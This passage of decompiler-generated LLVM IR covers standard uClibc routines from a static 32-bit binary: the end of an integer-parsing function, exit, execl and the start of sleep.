  %v1_8053520 = add i32 %v0_8053501.lcssa, 1
  store i32 %v1_8053520, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053521

dec_label_pc_8053521:                             ; preds = %dec_label_pc_8053510, %dec_label_pc_8053520
  %v0_8053533 = phi i32 [ %v0_8053501.lcssa, %dec_label_pc_8053510 ], [ %v1_8053520, %dec_label_pc_8053520 ]
  %v1_8053523 = and i32 %arg3, -17
  %v2_8053523 = icmp eq i32 %v1_8053523, 0
  %v1_8053529 = icmp eq i1 %v2_8053523, false
  br i1 %v1_8053529, label %dec_label_pc_805354f, label %dec_label_pc_805352b

dec_label_pc_805352b:                             ; preds = %dec_label_pc_8053521
  %v1_805352b = add i32 %arg3, 10
  store i32 %v1_805352b, i32* %esi.global-to-local, align 4
  %v1_805352e = inttoptr i32 %v0_8053533 to i8*
  %v2_805352e = load i8, i8* %v1_805352e, align 1
  %v8_805352e = icmp eq i8 %v2_805352e, 48
  %v1_8053531 = icmp eq i1 %v8_805352e, false
  br i1 %v1_8053531, label %dec_label_pc_8053545, label %dec_label_pc_8053533

dec_label_pc_8053533:                             ; preds = %dec_label_pc_805352b
  %v1_8053533 = add i32 %v0_8053533, 1
  store i32 %v1_8053533, i32* %ebx.global-to-local, align 4
  %v1_8053534 = add i32 %arg3, 8
  store i32 %v1_8053534, i32* %esi.global-to-local, align 4
  %v1_8053539 = inttoptr i32 %v1_8053533 to i8*
  %v2_8053539 = load i8, i8* %v1_8053539, align 1
  %v3_8053539 = zext i8 %v2_8053539 to i32
  %v5_8053539 = and i32 %v3_8053502.lcssa, -256
  %v6_8053539 = or i32 %v5_8053539, %v3_8053539
  %v1_805353b = or i32 %v6_8053539, 32
  %v3_805353b = trunc i32 %v1_805353b to i8
  store i32 %v1_805353b, i32* %eax.global-to-local, align 4
  %v10_805353e = icmp eq i8 %v3_805353b, 120
  %v1_8053540 = icmp eq i1 %v10_805353e, false
  br i1 %v1_8053540, label %dec_label_pc_8053545, label %dec_label_pc_8053542

dec_label_pc_8053542:                             ; preds = %dec_label_pc_8053533
  %v2_8053542 = mul i32 %v1_8053534, 2
  store i32 %v2_8053542, i32* %esi.global-to-local, align 4
  %v1_8053544 = add i32 %v0_8053533, 2
  store i32 %v1_8053544, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053545

dec_label_pc_8053545:                             ; preds = %dec_label_pc_8053533, %dec_label_pc_805352b, %dec_label_pc_8053542
  %v0_805356e12 = phi i32 [ %v1_8053533, %dec_label_pc_8053533 ], [ %v0_8053533, %dec_label_pc_805352b ], [ %v1_8053544, %dec_label_pc_8053542 ]
  %v0_80535c520 = phi i32 [ %v1_8053533, %dec_label_pc_8053533 ], [ %v4_80534f5, %dec_label_pc_805352b ], [ %v1_8053533, %dec_label_pc_8053542 ]
  %v0_8053545 = phi i32 [ %v1_8053534, %dec_label_pc_8053533 ], [ %v1_805352b, %dec_label_pc_805352b ], [ %v2_8053542, %dec_label_pc_8053542 ]
  %v7_8053548 = icmp sgt i32 %v0_8053545, 16
  br i1 %v7_8053548, label %dec_label_pc_805354a, label %dec_label_pc_805354f

dec_label_pc_805354a:                             ; preds = %dec_label_pc_8053545
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805354f

dec_label_pc_805354f:                             ; preds = %dec_label_pc_8053545, %dec_label_pc_8053521, %dec_label_pc_805354a
  %v0_80535c521 = phi i32 [ %v0_80535c520, %dec_label_pc_8053545 ], [ %v4_80534f5, %dec_label_pc_8053521 ], [ %v0_80535c520, %dec_label_pc_805354a ]
  %v0_805356e13 = phi i32 [ %v0_805356e12, %dec_label_pc_8053545 ], [ %v0_8053533, %dec_label_pc_8053521 ], [ %v0_805356e12, %dec_label_pc_805354a ]
  %v0_805355e = phi i32 [ %v0_8053545, %dec_label_pc_8053545 ], [ %arg3, %dec_label_pc_8053521 ], [ 16, %dec_label_pc_805354a ]
  %v1_805354f = add i32 %v0_805355e, -2
  store i32 %v1_805354f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_8053557 = icmp ugt i32 %v1_805354f, 34
  br i1 %v6_8053557, label %dec_label_pc_80535ba, label %dec_label_pc_8053559

dec_label_pc_8053559:                             ; preds = %dec_label_pc_805354f
  %div = udiv i32 -1, %v0_805355e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_805355e
  %v1_8053560 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_805359a = urem i32 %arg4, 256
  br label %dec_label_pc_805356e

dec_label_pc_805356c:                             ; preds = %dec_label_pc_80535b0, %dec_label_pc_805359a
  %v4_805356e.pre = phi i32 [ %v1_8053584, %dec_label_pc_80535b0 ], [ %v4_805356e.pre.pre, %dec_label_pc_805359a ]
  %v0_805356c = phi i32 [ %v1_805358b, %dec_label_pc_80535b0 ], [ %v0_805356c.pre, %dec_label_pc_805359a ]
  br label %dec_label_pc_805356e

dec_label_pc_805356e:                             ; preds = %dec_label_pc_8053559, %dec_label_pc_805356c
  %v0_80535c519 = phi i32 [ %v0_80535c521, %dec_label_pc_8053559 ], [ %v0_805356c, %dec_label_pc_805356c ]
  %v0_805358b = phi i32 [ %v0_805356e13, %dec_label_pc_8053559 ], [ %v0_805356c, %dec_label_pc_805356c ]
  %v4_805356e = phi i32 [ %div, %dec_label_pc_8053559 ], [ %v4_805356e.pre, %dec_label_pc_805356c ]
  %v1_805356e = inttoptr i32 %v0_805358b to i8*
  %v2_805356e = load i8, i8* %v1_805356e, align 1
  %v3_805356e = zext i8 %v2_805356e to i32
  %v5_805356e = and i32 %v4_805356e, -256
  %v6_805356e = or i32 %v3_805356e, %v5_805356e
  store i32 %v6_805356e, i32* %eax.global-to-local, align 4
  %v1_8053570 = add i32 %v6_805356e, -48
  store i32 %v1_8053570, i32* @ecx, align 4
  %v1_8053573 = trunc i32 %v1_8053570 to i8
  %tmp55 = icmp ult i8 %v1_8053573, 10
  br i1 %tmp55, label %dec_label_pc_8053584, label %dec_label_pc_8053578

dec_label_pc_8053578:                             ; preds = %dec_label_pc_805356e
  %v1_8053578 = or i32 %v6_805356e, 32
  %v3_8053578 = trunc i32 %v1_8053578 to i8
  store i32 %v1_8053578, i32* %eax.global-to-local, align 4
  %v1_805357b = and i32 %v1_8053570, -256
  %v2_805357b = or i32 %v1_805357b, 40
  store i32 %v2_805357b, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_8053578, 97
  br i1 %tmp56, label %dec_label_pc_8053584, label %dec_label_pc_8053581

dec_label_pc_8053581:                             ; preds = %dec_label_pc_8053578
  %v1_8053581 = add i32 %v1_8053578, -87
  store i32 %v1_8053581, i32* @ecx, align 4
  br label %dec_label_pc_8053584

dec_label_pc_8053584:                             ; preds = %dec_label_pc_8053578, %dec_label_pc_805356e, %dec_label_pc_8053581
  %v0_80535b3 = phi i32 [ %v2_805357b, %dec_label_pc_8053578 ], [ %v1_8053570, %dec_label_pc_805356e ], [ %v1_8053581, %dec_label_pc_8053581 ]
  %v1_8053584 = urem i32 %v0_80535b3, 256
  store i32 %v1_8053584, i32* %eax.global-to-local, align 4
  %v1_8053587 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053587 = sub i32 %v1_8053584, %v1_8053587
  %v10_8053587 = and i32 %v2_8053587, %v1_8053587
  %v11_8053587 = icmp slt i32 %v10_8053587, 0
  %v13_8053587 = icmp slt i32 %v2_8053587, 0
  %v2_8053589 = icmp eq i1 %v13_8053587, %v11_8053587
  br i1 %v2_8053589, label %dec_label_pc_80535ba, label %dec_label_pc_805358b

dec_label_pc_805358b:                             ; preds = %dec_label_pc_8053584
  %v1_805358b = add i32 %v0_805358b, 1
  store i32 %v1_805358b, i32* %ebx.global-to-local, align 4
  %v0_805358c = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_805358c, %div
  br i1 %tmp57, label %dec_label_pc_805359a, label %dec_label_pc_8053592

dec_label_pc_8053592:                             ; preds = %dec_label_pc_805358b
  %v15_805358c = icmp eq i32 %v0_805358c, %div
  %v1_8053592 = icmp eq i1 %v15_805358c, false
  br i1 %v1_8053592, label %dec_label_pc_80535b0, label %dec_label_pc_8053594

dec_label_pc_8053594:                             ; preds = %dec_label_pc_8053592
  %v1_8053594 = trunc i32 %v0_80535b3 to i8
  %tmp58 = icmp ugt i8 %v1_8053594, %v1_8053560
  br i1 %tmp58, label %dec_label_pc_805359a, label %dec_label_pc_80535b0

dec_label_pc_805359a:                             ; preds = %dec_label_pc_8053594, %dec_label_pc_805358b
  store i32 %v4_805359a, i32* %eax.global-to-local, align 4
  %v0_805359e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805359e = and i32 %v0_805359e, %v4_805359a
  store i32 %v2_805359e, i32* %ebp.global-to-local, align 4
  %v1_80535a0 = call i32 @__errno_location(i32 %div)
  store i32 %v1_80535a0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_80535a8 = inttoptr i32 %v1_80535a0 to i32*
  store i32 34, i32* %v1_80535a8, align 4
  %v0_805356c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805356e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805356c

dec_label_pc_80535b0:                             ; preds = %dec_label_pc_8053594, %dec_label_pc_8053592
  %v4_80535b0 = mul i32 %v0_805358c, %v1_8053587
  store i32 %v1_8053584, i32* %eax.global-to-local, align 4
  %v2_80535b6 = add i32 %v4_80535b0, %v1_8053584
  store i32 %v2_80535b6, i32* @edx, align 4
  br label %dec_label_pc_805356c

dec_label_pc_80535ba:                             ; preds = %dec_label_pc_8053584, %dec_label_pc_805354f
  %v0_80535c5 = phi i32 [ %v0_80535c521, %dec_label_pc_805354f ], [ %v0_80535c519, %dec_label_pc_8053584 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_805354f ], [ %div, %dec_label_pc_8053584 ]
  %v4_80535ba = icmp eq i32 %arg2, 0
  br i1 %v4_80535ba, label %dec_label_pc_80535c7, label %dec_label_pc_80535c1

dec_label_pc_80535c1:                             ; preds = %dec_label_pc_80535ba
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80535c5 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80535c5, i32* %v2_80535c5, align 4
  br label %dec_label_pc_80535c7

dec_label_pc_80535c7:                             ; preds = %dec_label_pc_80535ba, %dec_label_pc_80535c1
  %v0_80535c7 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80535c7, i32* %eax.global-to-local, align 4
  %v1_80535c9 = trunc i32 %v0_80535c7 to i8
  %v6_80535c9 = icmp eq i8 %v1_80535c9, 0
  %v2_80535cb = zext i1 %v6_80535c9 to i32
  %v1_80535cd4 = or i32 %v2_80535cb, -2147483648
  store i32 %v1_80535cd4, i32* %ebx.global-to-local, align 4
  %v5_80535d3 = icmp eq i8 %tmp37, 0
  br i1 %v5_80535d3, label %dec_label_pc_80535eb, label %dec_label_pc_80535da

dec_label_pc_80535da:                             ; preds = %dec_label_pc_80535c7
  %v0_80535da = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_80535da, %v1_80535cd4
  br i1 %tmp59, label %dec_label_pc_80535de, label %dec_label_pc_80535eb

dec_label_pc_80535de:                             ; preds = %dec_label_pc_80535da
  %v1_80535de = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_80535de, i32* %eax.global-to-local, align 4
  %v0_80535e3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80535e3, i32* @edx, align 4
  %v1_80535e5 = inttoptr i32 %v1_80535de to i32*
  store i32 34, i32* %v1_80535e5, align 4
  %v0_80535eb.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80535eb

dec_label_pc_80535eb:                             ; preds = %dec_label_pc_80535da, %dec_label_pc_80535c7, %dec_label_pc_80535de
  %v0_80535eb = phi i32 [ %v0_80535c7, %dec_label_pc_80535da ], [ %v0_80535c7, %dec_label_pc_80535c7 ], [ %v0_80535eb.pre, %dec_label_pc_80535de ]
  store i32 %v0_80535eb, i32* %eax.global-to-local, align 4
  %v3_80535ed = trunc i32 %v0_80535eb to i8
  %v4_80535ed = icmp eq i8 %v3_80535ed, 0
  %v0_80535f6.pre = load i32, i32* @edx, align 4
  br i1 %v4_80535ed, label %dec_label_pc_80535f3, label %dec_label_pc_80535f1

dec_label_pc_80535f1:                             ; preds = %dec_label_pc_80535eb
  %v1_80535f1 = sub i32 0, %v0_80535f6.pre
  store i32 %v1_80535f1, i32* @edx, align 4
  br label %dec_label_pc_80535f3

dec_label_pc_80535f3:                             ; preds = %dec_label_pc_80535eb, %dec_label_pc_80535f1
  %v0_80535f6 = phi i32 [ %v1_80535f1, %dec_label_pc_80535f1 ], [ %v0_80535f6.pre, %dec_label_pc_80535eb ]
  store i32 %v0_80535f6, i32* %eax.global-to-local, align 4
  %v2_80535f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80535f8, i32* @ebx, align 4
  ret i32 %v0_80535f6

; uselistorder directives
  uselistorder i32 %v0_80535f6, { 1, 0 }
  uselistorder i32 %v0_80535eb, { 1, 0 }
  uselistorder i32 %v0_805358c, { 0, 2, 1 }
  uselistorder i32 %v1_805358b, { 1, 0 }
  uselistorder i32 %v2_8053587, { 1, 0 }
  uselistorder i32 %v1_8053584, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80535b3, { 1, 0 }
  uselistorder i32 %v0_805356c, { 1, 0 }
  uselistorder i32 %v4_805359a, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805355e, { 1, 0, 2 }
  uselistorder i32 %v2_8053542, { 1, 0 }
  uselistorder i32 %v1_805353b, { 1, 0 }
  uselistorder i32 %v1_8053534, { 1, 0, 2 }
  uselistorder i32 %v0_8053533, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8053502.lcssa, { 1, 0 }
  uselistorder i32 %v0_8053501.lcssa, { 1, 0 }
  uselistorder i32 %v1_8053501, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80534f5, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_80534ef, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 -17, { 53, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80535f3, { 1, 0 }
  uselistorder label %dec_label_pc_80535eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80535c7, { 1, 0 }
  uselistorder label %dec_label_pc_8053584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805356e, { 1, 0 }
  uselistorder label %dec_label_pc_805354f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053545, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053521, { 1, 0 }
  uselistorder label %dec_label_pc_8053520, { 1, 0 }
  uselistorder label %dec_label_pc_8053501, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053613 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053613, i32* @ebx, align 4
  %v2_8053618 = call i32 @__pthread_return_void(i32 %v2_8053613, i32 134560279)
  %v1_8053624 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061520.763 to i32))
  %v0_8053629 = load i32, i32* @global_var_80677c4.764, align 4
  store i32 %v0_8053629, i32* @eax, align 4
  %v1_8053631 = icmp eq i32 %v0_8053629, 0
  br i1 %v1_8053631, label %dec_label_pc_805363e, label %dec_label_pc_8053635

dec_label_pc_8053635:                             ; preds = %entry
  %v0_8053638 = load i32, i32* @esi, align 4
  %v1_8053639 = call i32 @unknown_0(i32 %v0_8053638)
  store i32 %v1_8053639, i32* @eax, align 4
  br label %dec_label_pc_805363e

dec_label_pc_805363e:                             ; preds = %entry, %dec_label_pc_8053635
  %v2_8053643 = call i32 @__pthread_return_void(i32 %v2_8053613, i32 1)
  %v0_8053648 = call i32 @__GI___uClibc_fini()
  %v0_8053659 = call i32 @_stdio_term()
  %v0_8053661 = load i32, i32* @esi, align 4
  %v1_8053662 = call i32 @__GI__exit(i32 %v0_8053661)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 4, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_805363e, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805366c = load i32, i32* @ebx, align 4
  store i32 %v0_805366c, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805366f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_805366f, i32* %eax.global-to-local, align 4
  %v12_8053672 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053678

dec_label_pc_8053678:                             ; preds = %dec_label_pc_8053678, %entry
  %v0_805367b = phi i32 [ 0, %entry ], [ %v1_805367b, %dec_label_pc_8053678 ]
  %stack_var_-16.0 = phi i32 [ %v2_805366f, %entry ], [ %v1_805367c, %dec_label_pc_8053678 ]
  %v1_805367b = add i32 %v0_805367b, 1
  store i32 %v1_805367b, i32* %esi.global-to-local, align 4
  %v1_805367c = add i32 %stack_var_-16.0, 4
  store i32 %v1_805367c, i32* %eax.global-to-local, align 4
  %v1_8053682 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053682 = load i32, i32* %v1_8053682, align 4
  %v3_8053682 = icmp eq i32 %v2_8053682, 0
  %v1_8053685 = icmp eq i1 %v3_8053682, false
  br i1 %v1_8053685, label %dec_label_pc_8053678, label %dec_label_pc_8053687

dec_label_pc_8053687:                             ; preds = %dec_label_pc_8053678
  %v1_8053687 = mul i32 %v1_805367b, 4
  %v2_8053687 = add i32 %v1_8053687, 34
  %v1_805368e = and i32 %v2_8053687, -16
  %v2_8053691 = sub i32 %v12_8053672, %v1_805368e
  %v1_8053696 = add i32 %v2_8053691, 15
  %v1_805369a = and i32 %v1_8053696, -16
  store i32 %v1_805369a, i32* @ebx, align 4
  store i32 %v1_805369a, i32* %ecx.global-to-local, align 4
  %v2_805369f = inttoptr i32 %v1_805369a to i32*
  store i32 %arg2, i32* %v2_805369f, align 16
  store i32 %v2_805366f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536a7

dec_label_pc_80536a7:                             ; preds = %dec_label_pc_80536a7, %dec_label_pc_8053687
  %stack_var_-16.1 = phi i32 [ %v2_805366f, %dec_label_pc_8053687 ], [ %v1_80536ae, %dec_label_pc_80536a7 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80536aa = load i32, i32* %ecx.global-to-local, align 4
  %v1_80536aa = add i32 %v0_80536aa, 4
  store i32 %v1_80536aa, i32* %ecx.global-to-local, align 4
  %v0_80536ad = load i32, i32* %esi.global-to-local, align 4
  %v1_80536ad = add i32 %v0_80536ad, -1
  %v8_80536ad = icmp eq i32 %v1_80536ad, 0
  store i32 %v1_80536ad, i32* %esi.global-to-local, align 4
  %v1_80536ae = add i32 %stack_var_-16.1, 4
  %v1_80536b4 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80536b4 = load i32, i32* %v1_80536b4, align 4
  store i32 %v2_80536b4, i32* %eax.global-to-local, align 4
  %v2_80536b6 = inttoptr i32 %v1_80536aa to i32*
  store i32 %v2_80536b4, i32* %v2_80536b6, align 4
  %v1_80536b8 = icmp eq i1 %v8_80536ad, false
  br i1 %v1_80536b8, label %dec_label_pc_80536a7, label %dec_label_pc_80536ba

dec_label_pc_80536ba:                             ; preds = %dec_label_pc_80536a7
  %v0_80536ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80536ba = load i32, i32* @esp, align 4
  %v2_80536ba = add i32 %v1_80536ba, -4
  %v3_80536ba = inttoptr i32 %v2_80536ba to i32*
  store i32 %v0_80536ba, i32* %v3_80536ba, align 4
  %v0_80536bb = load i32, i32* @global_var_80677cc.765, align 4
  %v2_80536bb = add i32 %v1_80536ba, -8
  %v3_80536bb = inttoptr i32 %v2_80536bb to i32*
  store i32 %v0_80536bb, i32* %v3_80536bb, align 4
  %v0_80536c1 = load i32, i32* @ebx, align 4
  %v2_80536c1 = add i32 %v1_80536ba, -12
  %v3_80536c1 = inttoptr i32 %v2_80536c1 to i32*
  store i32 %v0_80536c1, i32* %v3_80536c1, align 4
  %v5_80536c2 = add i32 %v1_80536ba, -16
  %v6_80536c2 = inttoptr i32 %v5_80536c2 to i32*
  store i32 %arg1, i32* %v6_80536c2, align 4
  %v1_80536c5 = inttoptr i32 %v1_80536ae to i8*
  %v2_80536c5 = call i32 @__GI_execve(i8* %v1_80536c5)
  store i32 %v2_80536c5, i32* %eax.global-to-local, align 4
  %v2_80536cd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80536cd, i32* @ebx, align 4
  ret i32 %v2_80536c5

; uselistorder directives
  uselistorder i32 %v1_80536ad, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_805367c, { 1, 0 }
  uselistorder i32 %v1_805367b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_805366f, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_80536d5 = load i32, i32* @edi, align 4
  %v0_80536d6 = load i32, i32* @esi, align 4
  %v0_80536d7 = load i32, i32* @ebx, align 4
  %v15_80536d8 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_80536ea = icmp eq i32 %arg1, 0
  %v1_80536ec = icmp eq i1 %v1_80536ea, false
  br i1 %v1_80536ec, label %dec_label_pc_80536fe.preheader, label %dec_label_pc_805384b

dec_label_pc_80536fe.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536f3

dec_label_pc_80536f3:                             ; preds = %dec_label_pc_80536f3.dec_label_pc_80536f3_crit_edge, %dec_label_pc_80536fe.preheader
  %v0_80536f3 = phi i32 [ %v15_80536d8, %dec_label_pc_80536fe.preheader ], [ %v0_80536f3.pre, %dec_label_pc_80536f3.dec_label_pc_80536f3_crit_edge ]
  %v1_80536fe27 = phi i32 [ 31, %dec_label_pc_80536fe.preheader ], [ %v1_80536fe, %dec_label_pc_80536f3.dec_label_pc_80536f3_crit_edge ]
  %v2_80536f3 = mul i32 %v1_80536fe27, 4
  %v3_80536f3 = add i32 %v2_80536f3, 292
  %v4_80536f3 = add i32 %v3_80536f3, %v0_80536f3
  %v5_80536f3 = inttoptr i32 %v4_80536f3 to i32*
  store i32 0, i32* %v5_80536f3, align 4
  %v0_80536fe.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80536fe = add i32 %v0_80536fe.pre, -1
  %v9_80536fe = icmp slt i32 %v1_80536fe, 0
  store i32 %v1_80536fe, i32* %eax.global-to-local, align 4
  %v1_80536ff = icmp eq i1 %v9_80536fe, false
  br i1 %v1_80536ff, label %dec_label_pc_80536f3.dec_label_pc_80536f3_crit_edge, label %dec_label_pc_8053701

dec_label_pc_80536f3.dec_label_pc_80536f3_crit_edge: ; preds = %dec_label_pc_80536f3
  %v0_80536f3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80536f3

dec_label_pc_8053701:                             ; preds = %dec_label_pc_80536f3
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053717 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053717, i32* @ebx, align 4
  store i32 %v2_8053717, i32* %stack_var_-460, align 4
  %v4_805371f = call i32 @__sigaddset(i32 %v2_8053717, i32 17, i32 %v1_80536fe, i32 %v1_80536fe)
  store i32 %v4_805371f, i32* %eax.global-to-local, align 4
  %v2_8053727 = icmp slt i32 %v4_805371f, 0
  br i1 %v2_8053727, label %dec_label_pc_805384f, label %dec_label_pc_805372f

dec_label_pc_805372f:                             ; preds = %dec_label_pc_8053701
  %v2_8053730 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053730, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_805373b = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_805373b = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_805373b, i32 %v2_8053730)
  store i32 %v4_805373b, i32* %eax.global-to-local, align 4
  %v1_8053743 = icmp eq i32 %v4_805373b, 0
  %v1_8053745 = icmp eq i1 %v1_8053743, false
  br i1 %v1_8053745, label %dec_label_pc_805384f, label %dec_label_pc_805374b

dec_label_pc_805374b:                             ; preds = %dec_label_pc_805372f
  store i32 %v2_8053730, i32* %stack_var_-460, align 4
  %v4_8053750 = call i32 @__sigismember(i32 %v2_8053730, i32 17, i32 %v4_805373b, i32 %v4_805373b)
  store i32 %v4_8053750, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_805375d = icmp eq i32 %v4_8053750, 0
  br i1 %v1_805375d, label %dec_label_pc_8053771.preheader, label %dec_label_pc_8053819

dec_label_pc_8053771.preheader:                   ; preds = %dec_label_pc_805374b
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053766

dec_label_pc_8053766:                             ; preds = %dec_label_pc_8053766.dec_label_pc_8053766_crit_edge, %dec_label_pc_8053771.preheader
  %v0_8053766 = phi i32 [ %v15_80536d8, %dec_label_pc_8053771.preheader ], [ %v0_8053766.pre, %dec_label_pc_8053766.dec_label_pc_8053766_crit_edge ]
  %v1_805377126 = phi i32 [ 31, %dec_label_pc_8053771.preheader ], [ %v1_8053771, %dec_label_pc_8053766.dec_label_pc_8053766_crit_edge ]
  %v2_8053766 = mul i32 %v1_805377126, 4
  %v3_8053766 = add i32 %v2_8053766, 292
  %v4_8053766 = add i32 %v3_8053766, %v0_8053766
  %v5_8053766 = inttoptr i32 %v4_8053766 to i32*
  store i32 0, i32* %v5_8053766, align 4
  %v0_8053771.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8053771 = add i32 %v0_8053771.pre, -1
  %v9_8053771 = icmp slt i32 %v1_8053771, 0
  store i32 %v1_8053771, i32* %edx.global-to-local, align 4
  %v1_8053772 = icmp eq i1 %v9_8053771, false
  br i1 %v1_8053772, label %dec_label_pc_8053766.dec_label_pc_8053766_crit_edge, label %dec_label_pc_8053774

dec_label_pc_8053766.dec_label_pc_8053766_crit_edge: ; preds = %dec_label_pc_8053766
  %v0_8053766.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053766

dec_label_pc_8053774:                             ; preds = %dec_label_pc_8053766
  store i32 %v2_8053717, i32* %eax.global-to-local, align 4
  store i32 %v2_8053717, i32* %stack_var_-460, align 4
  %v4_8053780 = call i32 @__sigaddset(i32 %v2_8053717, i32 17, i32 0, i32 0)
  store i32 %v4_8053780, i32* %eax.global-to-local, align 4
  %v2_8053788 = icmp slt i32 %v4_8053780, 0
  br i1 %v2_8053788, label %dec_label_pc_805384f, label %dec_label_pc_8053790

dec_label_pc_8053790:                             ; preds = %dec_label_pc_8053774
  %v2_8053791 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053791, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_805379a = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8053791)
  store i32 %v4_805379a, i32* %eax.global-to-local, align 4
  %v2_80537a2 = icmp slt i32 %v4_805379a, 0
  %v1_80537a4 = icmp eq i1 %v2_80537a2, false
  br i1 %v1_80537a4, label %dec_label_pc_80537ce, label %dec_label_pc_80537a6

dec_label_pc_80537a6:                             ; preds = %dec_label_pc_8053790
  %v0_80537a6 = load i32, i32* %stack_var_-460, align 4
  %v1_80537a6 = call i32 @__errno_location(i32 %v0_80537a6)
  store i32 %v1_80537a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80537a6, i32* @ebx, align 4
  %v1_80537ad = inttoptr i32 %v1_80537a6 to i32*
  %v2_80537ad = load i32, i32* %v1_80537ad, align 4
  store i32 %v2_80537ad, i32* @esi, align 4
